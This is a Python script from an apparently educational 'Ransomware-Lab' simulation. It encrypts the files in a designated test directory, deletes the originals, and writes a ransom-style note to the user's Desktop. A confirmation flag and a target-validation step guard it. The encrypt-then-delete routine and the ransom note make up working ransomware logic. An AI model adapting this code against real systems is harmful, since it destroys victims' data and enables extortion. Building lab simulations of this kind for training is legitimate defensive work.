#!/usr/bin/env python3
"""Encrypt files in an explicitly prepared Ransomware-Lab test directory."""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

from ransomlab.common import (
    ENCRYPTED_SUFFIX,
    LabError,
    NOTE_NAME,
    atomic_write,
    encrypt_bytes,
    generate_code,
    iter_plain_files,
    resolve_lab_target,
)


CONFIRMATION_FLAG = "--i-understand-this-is-a-lab"


def encrypt_directory(target: Path, code: str) -> int:
    files = list(iter_plain_files(target))
    destinations = {path: path.with_name(path.name + ENCRYPTED_SUFFIX) for path in files}
    collisions = [destination for destination in destinations.values() if destination.exists()]
    if collisions:
        raise LabError(f"Encrypted destination already exists: {collisions[0]}")

    completed = 0
    for source, destination in destinations.items():
        atomic_write(destination, encrypt_bytes(source.read_bytes(), code))
        source.unlink()
        completed += 1
    return completed


def default_desktop() -> Path:
    return Path.home() / "Desktop"


def write_note(note_directory: Path, code: str) -> Path:
    note_directory.mkdir(parents=True, exist_ok=True)
    note_path = note_directory / NOTE_NAME
    text = (
        "RANSOMWARE-LAB EDUCATIONAL SIMULATION - NO PAYMENT IS REQUIRED\n\n"
        "All of your files have been encrypted.\n"
        "To unlock them, contact me with your encryption code at email@email.com.\n"
        f"Your encryption code is: {code}\n\n"
        "Use the decrypt command with this code to restore the test files.\n"
    )
    atomic_write(note_path, text.encode("utf-8"))
    return note_path


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Educational ransomware simulation for a marked test directory only."
    )
    parser.add_argument("--target", required=True, help="Prepared lab directory")
    parser.add_argument(
        CONFIRMATION_FLAG,
        action="store_true",
        help="Confirm that the target is disposable test data in an isolated VM",
    )
    parser.add_argument(
        "--note-dir",
        type=Path,
        default=default_desktop(),
        help="Ransom-note directory (default: the current user's Desktop)",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if not getattr(args, "i_understand_this_is_a_lab"):
        print(f"error: confirmation flag {CONFIRMATION_FLAG} is required", file=sys.stderr)
        return 2
    try:
        target = resolve_lab_target(args.target)
        code = generate_code()
        count = encrypt_directory(target, code)
        note = write_note(args.note_dir.expanduser().resolve(), code)
    except (LabError, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    print(f"Encrypted {count} file(s) inside: {target}")
    print(f"Recovery code: {code}")
    print(f"Ransomware-Lab note: {note}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
